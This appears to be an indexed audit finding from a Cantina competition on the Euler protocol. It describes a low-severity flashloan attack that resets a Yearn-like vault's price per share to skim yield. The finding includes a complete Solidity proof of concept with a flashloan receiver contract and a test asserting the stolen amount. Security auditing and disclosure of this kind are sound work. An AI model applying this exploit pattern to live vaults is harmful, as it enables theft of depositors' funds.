---
# Core Classification
protocol: Euler
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 54191
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/75df6661-6f99-4163-aadd-377cb8c1eb55
source_link: https://cdn.cantina.xyz/reports/cantina_competition_euler_may2024.pdf
github_link: none

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - services
  - yield_aggregator
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Alex The Entreprenerd
---

## Vulnerability Title

Flashloaning of Vault and cTokens allows stealing underlying value via Price Per Share Re- set 

### Overview

See description below for full details.

### Original Finding Content

## Context: Borrowing.sol#L147-L160

## Description
Great care was taken to prevent any Vault State changing operation from happening via the nonReentrant lock. However, this is insufficient when the asset being transferred is itself a vault or a tokenized deposit, such as Yearn Vault or a Compound Token. This is because of a common implementation that resets the price per share when all assets are withdrawn.

## Proof of Concept
- Flashloan Vault.
- Obtain 100% of the vault total supply.
- Redeem 100% of the shares.
- Reset the PPFS.
- Redeposit to mint new shares.
- Return the flashloan.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {EVaultTestBase} from "./EVaultTestBase.t.sol";
import "../../../src/EVault/shared/types/Types.sol";
import "../../../src/EVault/shared/Constants.sol";
import {ERC20, Context} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
import {console2} from "forge-std/Test.sol";

contract FlashLoanReceiver {
    constructor(YearnLikeVault _vault, IEVault _eVault) {
        vault = _vault;
        ERC20(_vault.want()).approve(address(_vault), type(uint256).max);
        evault = _eVault;
    }
    
    YearnLikeVault vault;
    IEVault evault;

    function startFlashloan() external {
        evault.flashLoan(vault.balanceOf(address(evault)), hex"");
    }

    function onFlashLoan(bytes memory) external {
        uint256 toRepay = vault.balanceOf(address(this));
        // Withdraw all
        vault.withdraw(toRepay);
        // Re-deposit at 1:1
        vault.deposit(toRepay);
        // Send them back
        vault.transfer(msg.sender, toRepay);
        // We are left with underlying from yield
    }
}

contract MockERC20 is ERC20 {
    constructor() ERC20("mock", "MOCK"){}
  
    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

contract YearnLikeVault is ERC20 {
    // The simplest Yearn V1, V2 and V3 like vault
    // Similar coded used by top autocompounders such as beefy
    address public want;

    constructor(address token) ERC20("yT", "YT") {
        want = token;
    }

    function balanceOfWant() public view returns (uint256) {
        return ERC20(want).balanceOf(address(this));
    }

    function ppfs() public view returns (uint256) {
        return balanceOfWant() * 1e18 / totalSupply();
    }

    function deposit(uint256 _amt) external {
        _mintSharesFor(msg.sender, _amt, balanceOfWant());
        ERC20(want).transferFrom(msg.sender, address(this), _amt);
    }

    function withdraw(uint256 _shares) external {
        uint256 r = balanceOfWant() * _shares / totalSupply();
        _burn(msg.sender, _shares);
        ERC20(want).transfer(msg.sender, r);
    }

    function _mintSharesFor(
        address recipient,
        uint256 _amount,
        uint256 _pool
    ) internal returns (uint256 shares) {
        if (totalSupply() == 0) {
            shares = _amount;
        } else {
            shares = _amount * totalSupply() / _pool;
        }
        if(shares != 0) {
            _mint(recipient, shares);
        }
    }
}

contract POC_Test is EVaultTestBase {
    using TypesLib for uint256;

    function setUp() public override {
        // There are 2 vaults deployed with bare minimum configuration:
        // - eTST vault using assetTST as the underlying
        // - eTST2 vault using assetTST2 as the underlying
        // Both vaults use the same MockPriceOracle and unit of account.
        // Both vaults are configured to use IRMTestDefault interest rate model.
        // Both vaults are configured to use 0.2e4 max liquidation discount.
        // Neither price oracles for the assets nor the LTVs are set.
        super.setUp();
        // In order to further configure the vaults, refer to the Governance module functions.
    }

    function test_POC() external {
        MockERC20 underlyingVault = new MockERC20();
        YearnLikeVault yearnVault = new YearnLikeVault(address(underlyingVault));
        IEVault eTST4 = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(yearnVault), address(0x123), address(0x1)))
        );
        
        underlyingVault.mint(address(this), 5e18);
        underlyingVault.approve(address(yearnVault), 1e18);
        yearnVault.deposit(1e18);
        uint256 startPpfs = yearnVault.ppfs();
        assertEq(yearnVault.ppfs(), 1e18, "1e18 ppfs");
        
        yearnVault.approve(address(eTST4), 1e18);
        eTST4.deposit(1e18, address(this));
        
        // Simulate yield for the Vault
        underlyingVault.transfer(address(yearnVault), 4e18);
        assertGt(yearnVault.ppfs(), startPpfs, "ppfs has grown");
        
        // flashloan and steal
        FlashLoanReceiver receiver = new FlashLoanReceiver(yearnVault, eTST4);
        receiver.startFlashloan();
        
        // Stolen amounts
        uint256 stolenUnderlying = underlyingVault.balanceOf(address(receiver));
        assertGt(stolenUnderlying, 0, "amount was skimmed");
        console2.log("stolenUnderlying", stolenUnderlying);
    }
}
```

## Recommendation
The proper way to mitigate this is to ensure that the value of the underlying asset is the same. The Euler Oracle Implementation should be sufficient to determine if PPFS was reset for Vault Tokens that are used as Collateral.

### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Euler |
| Report Date | N/A |
| Finders | Alex The Entreprenerd |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_euler_may2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/75df6661-6f99-4163-aadd-377cb8c1eb55

### Keywords for Search

`vulnerability`

